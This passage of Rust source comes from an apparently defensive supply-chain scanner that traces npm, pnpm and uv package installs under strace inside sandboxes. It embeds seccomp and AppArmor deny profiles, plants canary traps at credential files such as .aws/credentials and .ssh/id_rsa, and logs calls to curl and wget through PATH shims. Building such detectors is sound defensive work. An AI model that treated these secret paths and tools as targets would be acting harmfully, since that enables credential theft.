use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::IpAddr;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex, OnceLock};
use tempfile::TempDir;

const EMBEDDED_SECCOMP_PROFILE_NAME: &str = "seccomp.gyrseek-tracing.json";
const EMBEDDED_SECCOMP_PROFILE_JSON: &str = r#"{
    "defaultAction": "SCMP_ACT_ALLOW",
    "defaultErrnoRet": 1,
    "archMap": [
        {
            "architecture": "SCMP_ARCH_X86_64",
            "subArchitectures": [
                "SCMP_ARCH_X86",
                "SCMP_ARCH_X32"
            ]
        },
        {
            "architecture": "SCMP_ARCH_AARCH64",
            "subArchitectures": [
                "SCMP_ARCH_ARM"
            ]
        },
        {
            "architecture": "SCMP_ARCH_MIPS64",
            "subArchitectures": [
                "SCMP_ARCH_MIPS",
                "SCMP_ARCH_MIPS64N32"
            ]
        },
        {
            "architecture": "SCMP_ARCH_MIPS64N32",
            "subArchitectures": [
                "SCMP_ARCH_MIPS",
                "SCMP_ARCH_MIPS64"
            ]
        },
        {
            "architecture": "SCMP_ARCH_MIPSEL64",
            "subArchitectures": [
                "SCMP_ARCH_MIPSEL",
                "SCMP_ARCH_MIPSEL64N32"
            ]
        },
        {
            "architecture": "SCMP_ARCH_MIPSEL64N32",
            "subArchitectures": [
                "SCMP_ARCH_MIPSEL",
                "SCMP_ARCH_MIPSEL64"
            ]
        },
        {
            "architecture": "SCMP_ARCH_S390X",
            "subArchitectures": [
                "SCMP_ARCH_S390"
            ]
        },
        {
            "architecture": "SCMP_ARCH_RISCV64",
            "subArchitectures": []
        }
    ],
    "syscalls": [
        {
            "names": [
                "accept",
                "accept4",
                "bpf",
                "delete_module",
                "finit_module",
                "fsconfig",
                "fsmount",
                "fspick",
                "fsopen",
                "init_module",
                "io_uring_enter",
                "io_uring_register",
                "io_uring_setup",
                "kexec_file_load",
                "kexec_load",
                "listen",
                "mount",
                "move_mount",
                "name_to_handle_at",
                "nfsservctl",
                "open_by_handle_at",
                "open_tree",
                "perf_event_open",
                "pidfd_getfd",
                "pidfd_open",
                "pivot_root",
                "process_vm_writev",
                "umount2",
                "userfaultfd"
            ],
            "action": "SCMP_ACT_ERRNO",
            "errnoRet": 1
        }
    ]
}"#;

const EMBEDDED_APPARMOR_PROFILE_NAME: &str = "gyrseek-tracing";
/// Embedded AppArmor profile for Docker sandbox containers. Allows outbound
/// networking (package registries), ptrace (strace), and file access for
/// install probes (apt, uv, npm, pnpm). Loaded into the kernel via
/// apparmor_parser at runtime when GYRSEEK_DOCKER_APPARMOR_PROFILE=true.
/// Falls back to Docker's default profile if apparmor_parser is unavailable.
const EMBEDDED_APPARMOR_PROFILE_TEXT: &str = r#"#include <tunables/global>

profile gyrseek-tracing flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/consoles>

  capability chown,
  capability sys_ptrace,
  capability dac_override,
  capability dac_read_search,
  capability fowner,
  capability fsetid,
  capability kill,
  capability setgid,
  capability setuid,
  capability sys_chroot,
  capability mknod,
  capability setpcap,
  capability sys_resource,

  ptrace (trace,read,tracedby,readby),
  signal (send,receive),

  network inet tcp,
  network inet udp,
  network inet6 tcp,
  network inet6 udp,

  / r,
  /etc/** r,
  /usr/** rix,
  /bin/** rix,
  /sbin/** rix,
  /lib/** rix,
  /opt/** rix,
  /work/ rw,
  /work/** rwixk,
  /out/ rw,
  /out/** rwk,
  /tmp/ rw,
  /tmp/** rwixk,
  /var/** r,
  /root/ r,
  /root/** r,
  /home/ rw,
  /home/** rwixk,
  /proc/ r,
  /proc/** r,
  /dev/ rw,
  /dev/** rw,
  /sys/ r,
  /sys/** r,
  /run/ r,
  /run/** rw,
}"#;

struct ScannerImageConfig {
    image: String,
    prebuilt: bool,
}

/// A single traced probe: `((package, version), raw_strace_output)`.
pub(crate) type ProbeTrace = ((String, String), String);

pub(crate) trait SandboxRunner {
    fn trace_install(&self, manager: &str, package: &str, version: &str) -> Result<String, String>;

    fn trace_install_matrix(
        &self,
        manager: &str,
        probes: &[(String, String)],
    ) -> Result<Vec<ProbeTrace>, String> {
        probes
            .iter()
            .map(|(package, version)| {
                let trace = self.trace_install(manager, package, version)?;
                Ok(((package.clone(), version.clone()), trace))
            })
            .collect()
    }
}

pub(crate) fn build_runner_from_env(
    danger_disable_seccomp: bool,
) -> Result<Box<dyn SandboxRunner>, String> {
    let mode = std::env::var("GYRSEEK_SANDBOX").unwrap_or_else(|_| "docker".to_string());

    let runner: Result<Box<dyn SandboxRunner>, String> = match mode.as_str() {
        "docker" => {
            if !docker_available() {
                return Err("docker is not available but GYRSEEK_SANDBOX=docker".to_string());
            }
            Ok(Box::new(DockerRunner {
                danger_disable_seccomp,
            }))
        }
        "microvm" => {
            if !docker_available() {
                return Err("docker is not available but GYRSEEK_SANDBOX=microvm".to_string());
            }
            let runtime = std::env::var("GYRSEEK_MICROVM_RUNTIME")
                .unwrap_or_else(|_| "kata-runtime".to_string());
            if !docker_runtime_available(&runtime) {
                return Err(format!(
                    "MicroVM runtime '{}' is not available in Docker. Configure GYRSEEK_MICROVM_RUNTIME to an installed runtime (for example kata-runtime).",
                    runtime
                ));
            }
            Ok(Box::new(MicroVmRunner {
                runtime,
                danger_disable_seccomp,
            }))
        }
        "host" => {
            eprintln!(
                "⚠️ [gyrseek] CRITICAL WARNING: Running in HOST mode (GYRSEEK_SANDBOX=host). Container isolation is completely INACTIVE. Packages will execute directly on your machine!"
            );
            if danger_disable_seccomp {
                eprintln!(
                    "⚠️ [gyrseek] Warning: --danger-disable-seccomp has no effect in host mode."
                );
            }
            Ok(Box::new(HostRunner))
        }
        "nono" => {
            if !nono_available() {
                return Err(
                    "nono is not available on PATH or ~/.cargo/bin (install with 'cargo install nono-cli' or 'just install') but GYRSEEK_SANDBOX=nono".to_string(),
                );
            }
            if danger_disable_seccomp {
                eprintln!(
                    "⚠️ [gyrseek] Warning: --danger-disable-seccomp has no effect in nono mode (nono enforces kernel sandboxing via Landlock/Seatbelt)."
                );
            }
            Ok(Box::new(NonoRunner))
        }
        _ => Err(format!(
            "Unsupported GYRSEEK_SANDBOX mode '{}'. Supported values: docker, microvm, host, nono",
            mode
        )),
    };

    if runner.is_ok() && mode != "host" && mode != "nono" {
        announce_seccomp_status(danger_disable_seccomp);
        announce_apparmor_status();
    }

    runner
}

struct HostRunner;

impl SandboxRunner for HostRunner {
    fn trace_install(&self, manager: &str, package: &str, version: &str) -> Result<String, String> {
        let temp_dir =
            tempfile::tempdir().map_err(|e| format!("failed to create temp dir: {e}"))?;
        let target_path = temp_dir.path().to_string_lossy().to_string();

        let cmd_args = if is_npm_family_manager(manager) {
            let mut args = vec![
                "-f".to_string(),
                "-e".to_string(),
                "trace=network,execve,?execveat,open,openat,openat2,openat64,link,linkat,symlink,symlinkat,clone,clone3,fork,vfork,dup,dup2,dup3,fcntl".to_string(),
                manager.to_string(),
                npm_family_install_subcommand(manager).to_string(),
                format!("{}@{}", package, version),
                npm_family_install_dir_flag(manager).to_string(),
                target_path,
            ];
            if manager == "pnpm" {
                args.push("--lockfile=false".to_string());
            } else {
                args.push("--no-save".to_string());
            }
            args
        } else {
            vec![
                "-f".to_string(),
                "-e".to_string(),
                "trace=network,execve,?execveat,open,openat,openat2,openat64,link,linkat,symlink,symlinkat,clone,clone3,fork,vfork,dup,dup2,dup3,fcntl".to_string(),
                "uv".to_string(),
                "pip".to_string(),
                "install".to_string(),
                format!("{}=={}", package, version),
                "--target".to_string(),
                target_path,
                "--no-cache".to_string(),
            ]
        };

        let output = Command::new("strace")
            .args(&cmd_args)
            .stderr(Stdio::piped())
            .stdout(Stdio::null())
            .output()
            .map_err(|e| format!("failed to execute host strace: {e}"))?;

        Ok(String::from_utf8_lossy(&output.stderr).to_string())
    }
}

struct DockerRunner {
    danger_disable_seccomp: bool,
}

struct MicroVmRunner {
    runtime: String,
    danger_disable_seccomp: bool,
}

impl SandboxRunner for DockerRunner {
    fn trace_install(&self, manager: &str, package: &str, version: &str) -> Result<String, String> {
        let probes = vec![(package.to_string(), version.to_string())];
        let mut results = self.trace_install_matrix(manager, &probes)?;
        if results.is_empty() {
            return Err("docker matrix tracing returned no results".to_string());
        }
        Ok(results.remove(0).1)
    }

    fn trace_install_matrix(
        &self,
        manager: &str,
        probes: &[(String, String)],
    ) -> Result<Vec<ProbeTrace>, String> {
        trace_install_docker_matrix_with_runtime(manager, probes, None, self.danger_disable_seccomp)
    }
}

impl SandboxRunner for MicroVmRunner {
    fn trace_install(&self, manager: &str, package: &str, version: &str) -> Result<String, String> {
        let probes = vec![(package.to_string(), version.to_string())];
        let mut results = self.trace_install_matrix(manager, &probes)?;
        if results.is_empty() {
            return Err("microvm matrix tracing returned no results".to_string());
        }
        Ok(results.remove(0).1)
    }

    fn trace_install_matrix(
        &self,
        manager: &str,
        probes: &[(String, String)],
    ) -> Result<Vec<ProbeTrace>, String> {
        trace_install_docker_matrix_with_runtime(
            manager,
            probes,
            Some(&self.runtime),
            self.danger_disable_seccomp,
        )
    }
}

pub(crate) struct NonoRunner;

pub(crate) fn resolve_nono_bin() -> std::path::PathBuf {
    if let Ok(path) = std::env::var("GYRSEEK_NONO_PATH")
        && !path.trim().is_empty()
    {
        return std::path::PathBuf::from(path);
    }
    if let Some(sibling) = std::env::current_exe()
        .ok()
        .and_then(|exe| exe.parent().map(|p| p.join("nono")))
        .filter(|sibling| sibling.is_file())
    {
        return sibling;
    }
    if let Ok(cargo_home) = std::env::var("CARGO_HOME") {
        let cargo_bin = std::path::PathBuf::from(cargo_home).join("bin/nono");
        if cargo_bin.is_file() {
            return cargo_bin;
        }
    }
    if let Ok(home) = std::env::var("HOME") {
        let cargo_bin = std::path::PathBuf::from(home).join(".cargo/bin/nono");
        if cargo_bin.is_file() {
            return cargo_bin;
        }
    }
    if let Some(p) = find_in_path("nono") {
        return p;
    }
    std::path::PathBuf::from("nono")
}

pub(crate) fn nono_available() -> bool {
    let nono_bin = resolve_nono_bin();
    Command::new(&nono_bin)
        .arg("--version")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

fn find_in_path(cmd: &str) -> Option<std::path::PathBuf> {
    if cmd.contains(std::path::MAIN_SEPARATOR) {
        let p = std::path::PathBuf::from(cmd);
        if p.exists() {
            return Some(p);
        }
    }
    if let Ok(paths) = std::env::var("PATH") {
        for dir in std::env::split_paths(&paths) {
            let p = dir.join(cmd);
            if p.is_file() {
                return Some(p);
            }
        }
    }
    None
}

pub(crate) fn extract_host_from_url(s: &str) -> Option<String> {
    let trimmed = s.trim();
    let without_proto = trimmed
        .strip_prefix("https://")
        .or_else(|| trimmed.strip_prefix("http://"))
        .unwrap_or(trimmed);
    let host_port = without_proto.split('/').next()?.split('@').next_back()?;
    let host = host_port.split(':').next()?.trim();
    if !host.is_empty() && host.contains('.') {
        Some(host.to_string())
    } else {
        None
    }
}

pub(crate) fn default_allowed_domains_for_manager(manager: &str) -> Vec<String> {
    if is_npm_family_manager(manager) {
        vec![
            "registry.npmjs.org".to_string(),
            "*.npmjs.org".to_string(),
            "registry.yarnpkg.com".to_string(),
            "*.yarnpkg.com".to_string(),
        ]
    } else {
        vec![
            "pypi.org".to_string(),
            "*.pypi.org".to_string(),
            "files.pythonhosted.org".to_string(),
            "*.pythonhosted.org".to_string(),
        ]
    }
}

pub(crate) fn discover_registry_domains_from_env() -> Vec<String> {
    let mut domains = Vec::new();
    for env_key in [
        "NPM_CONFIG_REGISTRY",
        "PIP_INDEX_URL",
        "PIP_EXTRA_INDEX_URL",
        "UV_INDEX_URL",
        "POETRY_REPOSITORIES_DEFAULT_URL",
    ] {
        if let Ok(val) = std::env::var(env_key) {
            for part in val.split([' ', ',', '\n']) {
                if let Some(host) = extract_host_from_url(part) {
                    domains.push(host);
                }
            }
        }
    }
    if let Ok(allowed) = std::env::var("GYRSEEK_ALLOWED_DOMAINS") {
        for part in allowed.split([',', ' ']) {
            let trimmed = part.trim();
            if !trimmed.is_empty() {
                domains.push(trimmed.to_string());
            }
        }
    }
    domains.sort();
    domains.dedup();
    domains
}

pub(crate) fn extract_domains_from_nono_audit_log(audit_jsonl: &str) -> Vec<String> {
    let mut domains = Vec::new();
    for line in audit_jsonl.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        let Ok(val) = serde_json::from_str::<serde_json::Value>(trimmed) else {
            continue;
        };
        let event_obj = val.get("event");
        let payload = if let Some(e) = event_obj {
            if let Some(inner) = e.get("event") {
                inner
            } else {
                e
            }
        } else {
            &val
        };

        let is_denied = payload
            .get("decision")
            .and_then(|d| d.as_str())
            .map(|d| d.eq_ignore_ascii_case("deny") || d.eq_ignore_ascii_case("block"))
            .unwrap_or(false)
            || payload
                .get("allowed")
                .and_then(|a| a.as_bool())
                .map(|a| !a)
                .unwrap_or(false)
            || payload
                .get("action")
                .and_then(|a| a.as_str())
                .map(|a| a.eq_ignore_ascii_case("deny") || a.eq_ignore_ascii_case("block"))
                .unwrap_or(false)
            || payload
                .get("denied")
                .and_then(|d| d.as_bool())
                .unwrap_or(false)
            || val
                .get("decision")
                .and_then(|d| d.as_str())
                .map(|d| d.eq_ignore_ascii_case("deny") || d.eq_ignore_ascii_case("block"))
                .unwrap_or(false)
            || val
                .get("action")
                .and_then(|a| a.as_str())
                .map(|a| a.eq_ignore_ascii_case("deny") || a.eq_ignore_ascii_case("block"))
                .unwrap_or(false);

        if is_denied {
            continue;
        }

        if let Some(target_val) = payload
            .get("target")
            .or_else(|| payload.get("host"))
            .and_then(|t| t.as_str())
        {
            let target = target_val.trim();
            if !target.is_empty()
                && !target.starts_with("unix:")
                && target.parse::<IpAddr>().is_err()
                && target.contains('.')
            {
                domains.push(target.to_string());
            }
        }
    }
    domains.sort();
    domains.dedup();
    domains
}

pub(crate) fn sandbox_mem_limit() -> String {
    std::env::var("GYRSEEK_MEM_LIMIT")
        .ok()
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
        .unwrap_or_else(|| "2g".to_string())
}

pub(crate) fn sandbox_max_processes() -> String {
    std::env::var("GYRSEEK_MAX_PROCESSES")
        .ok()
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
        .or_else(|| {
            std::env::var("GYRSEEK_PIDS_LIMIT")
                .ok()
                .map(|v| v.trim().to_string())
                .filter(|v| !v.is_empty())
        })
        .unwrap_or_else(|| "256".to_string())
}

pub(crate) fn nono_resource_limit_args() -> Vec<String> {
    nono_resource_limit_args_for_os(std::env::consts::OS)
}

pub(crate) fn nono_resource_limit_args_for_os(os: &str) -> Vec<String> {
    if os == "linux" {
        vec![
            "--memory".to_string(),
            sandbox_mem_limit(),
            "--max-processes".to_string(),
            sandbox_max_processes(),
        ]
    } else {
        Vec::new()
    }
}

pub(crate) fn darwin_user_cache_dir() -> Option<String> {
    if std::env::consts::OS == "macos" {
        let output = Command::new("getconf")
            .arg("DARWIN_USER_CACHE_DIR")
            .output()
            .ok()?;
        if output.status.success() {
            let path = String::from_utf8_lossy(&output.stdout).trim().to_string();
            let trimmed = path.trim_end_matches('/').to_string();
            if !trimmed.is_empty() {
                return Some(trimmed);
            }
        }
    }
    None
}

pub(crate) fn nono_profile_content_for_os(
    os: &str,
    darwin_cache_dir: Option<&str>,
) -> Option<String> {
    if os == "macos" {
        let mut deny_rules = vec![
            "      { \"path\": \"/tmp\" }".to_string(),
            "      { \"path\": \"/private/tmp\" }".to_string(),
        ];
        if let Some(c) = darwin_cache_dir {
            let clean = c.trim().trim_end_matches('/');
            if !clean.is_empty() {
                deny_rules.push(format!("      {{ \"path\": \"{}\" }}", clean));
                if let Some(stripped) = clean.strip_prefix("/private") {
                    deny_rules.push(format!("      {{ \"path\": \"{}\" }}", stripped));
                } else {
                    deny_rules.push(format!("      {{ \"path\": \"/private{}\" }}", clean));
                }
            }
        }
        Some(format!(
            r#"{{
  "meta": {{
    "name": "gyrseek-profile"
  }},
  "filesystem": {{
    "deny": [
{}
    ]
  }}
}}"#,
            deny_rules.join(",\n")
        ))
    } else if os == "linux" {
        Some(
            r#"{
  "meta": {
    "name": "gyrseek-profile"
  },
  "groups": {
    "exclude": [
      "system_write_linux"
    ]
  },
  "filesystem": {
    "write": [
      "/dev/null",
      "/dev/zero",
      "/dev/full",
      "/dev/tty",
      "/dev/stdout",
      "/dev/stderr",
      "/dev/fd",
      "/dev/pts",
      "/proc/self/fd"
    ]
  }
}"#
            .to_string(),
        )
    } else {
        None
    }
}

pub(crate) struct CanaryTrap {
    #[cfg(unix)]
    paths: Vec<(PathBuf, String)>,
    #[cfg(unix)]
    accessed: Arc<Mutex<Vec<String>>>,
    #[cfg(unix)]
    stop: Arc<AtomicBool>,
    #[cfg(unix)]
    handles: Vec<std::thread::JoinHandle<()>>,
}

impl CanaryTrap {
    #[cfg(unix)]
    pub(crate) fn setup(work_dir: &Path, home_dir: &Path, manager: &str) -> Result<Self, String> {
        let mut targets = vec![
            (work_dir.join(".env"), "/work/.env".to_string()),
            (
                work_dir.join(".aws").join("credentials"),
                "/root/.aws/credentials".to_string(),
            ),
            (
                work_dir.join(".ssh").join("id_rsa"),
                "/root/.ssh/id_rsa".to_string(),
            ),
            (home_dir.join(".env"), "/work/.env".to_string()),
            (
                home_dir.join(".aws").join("credentials"),
                "/root/.aws/credentials".to_string(),
            ),
            (
                home_dir.join(".ssh").join("id_rsa"),
                "/root/.ssh/id_rsa".to_string(),
            ),
        ];

        // Skip .npmrc if the manager is an npm-family manager (npm, pnpm)
        // because the manager itself reads .npmrc during startup.
        if !is_npm_family_manager(manager) {
            targets.push((work_dir.join(".npmrc"), "/root/.npmrc".to_string()));
            targets.push((home_dir.join(".npmrc"), "/root/.npmrc".to_string()));
        }

        let accessed = Arc::new(Mutex::new(Vec::new()));
        let stop = Arc::new(AtomicBool::new(false));
        let mut handles = Vec::new();
        let mut active_paths = Vec::new();

        for (fifo_path, virtual_path) in targets {
            if let Some(parent) = fifo_path.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            let _ = std::fs::remove_file(&fifo_path);

            let c_path = match std::ffi::CString::new(fifo_path.to_string_lossy().as_bytes()) {
                Ok(c) => c,
                Err(_) => continue,
            };

            let res = unsafe { libc::mkfifo(c_path.as_ptr(), 0o666) };
            if res != 0 {
                continue;
            }

            active_paths.push((fifo_path.clone(), virtual_path.clone()));

            let thread_fifo = fifo_path.clone();
            let thread_virtual = virtual_path;
            let thread_accessed = Arc::clone(&accessed);
            let thread_stop = Arc::clone(&stop);

            let handle = std::thread::spawn(move || {
                use std::os::unix::fs::OpenOptionsExt;
                let mut recorded = false;
                while !thread_stop.load(Ordering::SeqCst) {
                    let mut file = match std::fs::OpenOptions::new()
                        .write(true)
                        .custom_flags(libc::O_NONBLOCK)
                        .open(&thread_fifo)
                    {
                        Ok(f) => f,
                        Err(e) if e.raw_os_error() == Some(libc::ENXIO) => {
                            std::thread::sleep(std::time::Duration::from_millis(10));
                            continue;
                        }
                        Err(_) => break,
                    };
                    if thread_stop.load(Ordering::SeqCst) {
                        break;
                    }
                    if !recorded {
                        if let Ok(mut guard) = thread_accessed.lock() {
                            guard.push(thread_virtual.clone());
                        }
                        recorded = true;
                    }
                    let _ = file.write_all(b"KEY=gyrseek-canary-trap\n");
                    let _ = file.flush();
                    drop(file);
                    // Leave a no-writer window so the reader observes EOF,
                    // and avoid a busy loop while a reader holds the FIFO open.
                    std::thread::sleep(std::time::Duration::from_millis(50));
                }
            });
            handles.push(handle);
        }

        Ok(Self {
            paths: active_paths,
            accessed,
            stop,
            handles,
        })
    }

    #[cfg(not(unix))]
    pub(crate) fn setup(
        _work_dir: &Path,
        _home_dir: &Path,
        _manager: &str,
    ) -> Result<Self, String> {
        Ok(Self {})
    }

    #[cfg(unix)]
    pub(crate) fn teardown(mut self) -> Vec<String> {
        self.stop.store(true, Ordering::SeqCst);

        while self.handles.iter().any(|h| !h.is_finished()) {
            for (fifo_path, _) in &self.paths {
                if let Ok(c_path) = std::ffi::CString::new(fifo_path.to_string_lossy().as_bytes()) {
                    let fd =
                        unsafe { libc::open(c_path.as_ptr(), libc::O_RDONLY | libc::O_NONBLOCK) };
                    if fd >= 0 {
                        unsafe {
                            libc::close(fd);
                        }
                    }
                }
            }
            std::thread::sleep(std::time::Duration::from_millis(1));
        }

        for handle in self.handles.drain(..) {
            let _ = handle.join();
        }

        for (fifo_path, _) in &self.paths {
            let _ = std::fs::remove_file(fifo_path);
        }

        let mut res = self
            .accessed
            .lock()
            .unwrap_or_else(|p| p.into_inner())
            .clone();
        res.sort();
        res.dedup();
        res
    }

    #[cfg(not(unix))]
    pub(crate) fn teardown(self) -> Vec<String> {
        Vec::new()
    }
}

impl Drop for CanaryTrap {
    fn drop(&mut self) {
        #[cfg(unix)]
        {
            self.stop.store(true, Ordering::SeqCst);
            let deadline = std::time::Instant::now() + std::time::Duration::from_millis(500);
            while self.handles.iter().any(|h| !h.is_finished())
                && std::time::Instant::now() < deadline
            {
                for (fifo_path, _) in &self.paths {
                    if let Ok(c_path) =
                        std::ffi::CString::new(fifo_path.to_string_lossy().as_bytes())
                    {
                        let fd = unsafe {
                            libc::open(c_path.as_ptr(), libc::O_RDONLY | libc::O_NONBLOCK)
                        };
                        if fd >= 0 {
                            unsafe {
                                libc::close(fd);
                            }
                        }
                    }
                }
                std::thread::sleep(std::time::Duration::from_millis(1));
            }

            for handle in self.handles.drain(..) {
                let _ = handle.join();
            }

            for (fifo_path, _) in &self.paths {
                let _ = std::fs::remove_file(fifo_path);
            }
        }
    }
}

type ExecEvents = Arc<Mutex<Vec<(String, Vec<String>)>>>;

pub(crate) struct PathShims {
    shims_dir: PathBuf,
    fifo_path: PathBuf,
    events: ExecEvents,
    stop: Arc<AtomicBool>,
    handle: Option<std::thread::JoinHandle<()>>,
}

impl PathShims {
    #[cfg(unix)]
    pub(crate) fn setup(shims_dir_parent: &Path, event_pipe_parent: &Path) -> Result<Self, String> {
        let shims_dir = shims_dir_parent.join("shims");
        std::fs::create_dir_all(&shims_dir)
            .map_err(|e| format!("failed to create shims dir: {e}"))?;
        let fifo_path = event_pipe_parent.join("gyrseek_exec.fifo");
        let _ = std::fs::remove_file(&fifo_path);

        let c_path = std::ffi::CString::new(fifo_path.to_string_lossy().as_bytes())
            .map_err(|e| format!("invalid fifo path: {e}"))?;
        let res = unsafe { libc::mkfifo(c_path.as_ptr(), 0o666) };
        if res != 0 {
            return Err(format!(
                "failed to create exec fifo: {}",
                std::io::Error::last_os_error()
            ));
        }

        let watched = ["git", "bun", "deno", "curl", "wget"];
        for exe in watched {
            let shim_path = shims_dir.join(exe);
            let script = format!(
                r#"#!/bin/sh
EXE="$(basename "$0")"
{{ printf "%s\0" "$EXE" "$@"; printf "\n"; }} > "{}" 2>/dev/null
REAL_PATH="$(echo "$PATH" | tr ':' '\n' | grep -v "{}" | tr '\n' ':')"
REAL_BIN="$(PATH="$REAL_PATH" which "$EXE" 2>/dev/null)"
if [ -n "$REAL_BIN" ] && [ -x "$REAL_BIN" ]; then
    exec "$REAL_BIN" "$@"
fi
exit 127
"#,
                fifo_path.display(),
                shims_dir.display(),
            );
            std::fs::write(&shim_path, script)
                .map_err(|e| format!("failed to write shim for {exe}: {e}"))?;
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(&shim_path, std::fs::Permissions::from_mode(0o755));
        }

        let events = Arc::new(Mutex::new(Vec::new()));
        let stop = Arc::new(AtomicBool::new(false));

        let thread_fifo = fifo_path.clone();
        let thread_events = Arc::clone(&events);
        let thread_stop = Arc::clone(&stop);

        let handle = std::thread::spawn(move || {
            let Ok(c_path) = std::ffi::CString::new(thread_fifo.to_string_lossy().as_bytes())
            else {
                return;
            };

            // Open with O_RDWR | O_NONBLOCK:
            // 1. O_NONBLOCK ensures open() returns immediately without blocking.
            // 2. Holding a write descriptor in the reader prevents premature POLLHUP / EOF
            //    when external writers connect and disconnect.
            let fd = unsafe { libc::open(c_path.as_ptr(), libc::O_RDWR | libc::O_NONBLOCK) };
            if fd < 0 {
                return;
            }

            let mut buffer = Vec::new();
            let mut read_buf = [0u8; 4096];

            loop {
                // If stop was requested, drain any remaining data from the FIFO and exit.
                if thread_stop.load(Ordering::SeqCst) {
                    loop {
                        let n = unsafe {
                            libc::read(
                                fd,
                                read_buf.as_mut_ptr() as *mut libc::c_void,
                                read_buf.len(),
                            )
                        };
                        if n > 0 {
                            buffer.extend_from_slice(&read_buf[..n as usize]);
                            Self::parse_buffer(&mut buffer, &thread_events);
                        } else {
                            break;
                        }
                    }
                    if !buffer.is_empty() {
                        Self::parse_line(&buffer, &thread_events);
                    }
                    break;
                }

                let mut pfd = libc::pollfd {
                    fd,
                    events: libc::POLLIN,
                    revents: 0,
                };

                let ret = unsafe { libc::poll(&mut pfd, 1, 20) };
                if ret > 0 && (pfd.revents & libc::POLLIN) != 0 {
                    loop {
                        let n = unsafe {
                            libc::read(
                                fd,
                                read_buf.as_mut_ptr() as *mut libc::c_void,
                                read_buf.len(),
                            )
                        };
                        if n > 0 {
                            buffer.extend_from_slice(&read_buf[..n as usize]);
                            Self::parse_buffer(&mut buffer, &thread_events);
                        } else {
                            break;
                        }
                    }
                }
            }

            unsafe {
                libc::close(fd);
            }
        });

        Ok(Self {
            shims_dir,
            fifo_path,
            events,
            stop,
            handle: Some(handle),
        })
    }

    #[cfg(unix)]
    fn parse_buffer(buffer: &mut Vec<u8>, events: &ExecEvents) {
        while let Some(pos) = buffer.iter().position(|&b| b == b'\n') {
            let line: Vec<u8> = buffer.drain(..=pos).collect();
            let content = &line[..line.len() - 1];
            Self::parse_line(content, events);
        }
    }

    #[cfg(unix)]
    fn parse_line(line: &[u8], events: &ExecEvents) {
        if line.is_empty() {
            return;
        }
        let tokens: Vec<String> = line
            .split(|&b| b == 0)
            .filter(|tok| !tok.is_empty())
            .map(|tok| String::from_utf8_lossy(tok).to_string())
            .collect();
        if !tokens.is_empty() {
            let exe = tokens[0].clone();
            let argv = tokens[1..].to_vec();
            if let Ok(mut guard) = events.lock() {
                guard.push((exe, argv));
            }
        }
    }

    #[cfg(not(unix))]
    pub(crate) fn setup(
        shims_dir_parent: &Path,
        _event_pipe_parent: &Path,
    ) -> Result<Self, String> {
        let shims_dir = shims_dir_parent.join("shims");
        std::fs::create_dir_all(&shims_dir)
            .map_err(|e| format!("failed to create shims dir: {e}"))?;
        let fifo_path = shims_dir_parent.join("gyrseek_exec.log");
        let events = Arc::new(Mutex::new(Vec::new()));
        let stop = Arc::new(AtomicBool::new(false));
        Ok(Self {
            shims_dir,
            fifo_path,
            events,
            stop,
            handle: None,
        })
    }

    pub(crate) fn shims_dir(&self) -> &Path {
        &self.shims_dir
    }

    pub(crate) fn fifo_path(&self) -> &Path {
        &self.fifo_path
    }

    #[cfg(unix)]
    pub(crate) fn read_exec_events(mut self) -> Vec<(String, Vec<String>)> {
        self.stop.store(true, Ordering::SeqCst);

        if let Some(handle) = self.handle.take() {
            let deadline = std::time::Instant::now() + std::time::Duration::from_millis(250);
            while !handle.is_finished() && std::time::Instant::now() < deadline {
                std::thread::sleep(std::time::Duration::from_millis(5));
            }
            if handle.is_finished() {
                let _ = handle.join();
            }
        }

        let _ = std::fs::remove_file(&self.fifo_path);

        self.events
            .lock()
            .unwrap_or_else(|p| p.into_inner())
            .clone()
    }

    #[cfg(not(unix))]
    pub(crate) fn read_exec_events(self) -> Vec<(String, Vec<String>)> {
        Vec::new()
    }
}

impl Drop for PathShims {
    fn drop(&mut self) {
        self.stop.store(true, Ordering::SeqCst);
        #[cfg(unix)]
        {
            if let Some(handle) = self.handle.take() {
                let deadline = std::time::Instant::now() + std::time::Duration::from_millis(250);
                while !handle.is_finished() && std::time::Instant::now() < deadline {
                    std::thread::sleep(std::time::Duration::from_millis(5));
                }
                if handle.is_finished() {
                    let _ = handle.join();
                }
            }
            let _ = std::fs::remove_file(&self.fifo_path);
        }
    }
}

pub(crate) fn parse_nono_diagnostics_denials(stderr: &[u8]) -> Vec<String> {
    let mut denied_paths = Vec::new();
    let text = String::from_utf8_lossy(stderr);
    let candidate_starts: Vec<usize> = text.match_indices('{').map(|(idx, _)| idx).collect();
    for &start_idx in candidate_starts.iter().rev() {
        let candidate = &text[start_idx..];
        let mut de = serde_json::Deserializer::from_str(candidate).into_iter::<serde_json::Value>();
        if let Some(Ok(val)) = de.next()
            && let Some(session) = val.get("session")
        {
            if let Some(denials) = session.get("denials").and_then(|d| d.as_array()) {
                for d in denials {
                    if let Some(p) = d.get("path").and_then(|p| p.as_str()) {
                        let trimmed = p.trim();
                        if !trimmed.is_empty() {
                            denied_paths.push(trimmed.to_string());
                        }
                    }
                }
            }
            if let Some(violations) = session.get("violations").and_then(|v| v.as_array()) {
                for v in violations {
                    if let Some(p) = v.get("target").and_then(|p| p.as_str()) {
                        let trimmed = p.trim();
                        if !trimmed.is_empty() {
                            denied_paths.push(trimmed.to_string());
                        }
                    }
                }
            }
            break;
        }
    }
    denied_paths.sort();
    denied_paths.dedup();
    denied_paths
}

impl NonoRunner {
    pub(crate) fn trace_install_with_domains(
        &self,
        manager: &str,
        package: &str,
        version: &str,
        domain_constraint: Option<&[String]>,
    ) -> Result<(String, Vec<String>), String> {
        let temp_dir =
            tempfile::tempdir().map_err(|e| format!("failed to create temp dir: {e}"))?;
        let allow_path = temp_dir.path().to_string_lossy().to_string();
        let work_dir = temp_dir.path().join("work");
        let home_dir = temp_dir.path().join("home");
        let _ = std::fs::create_dir_all(&work_dir);
        let _ = std::fs::create_dir_all(&home_dir);
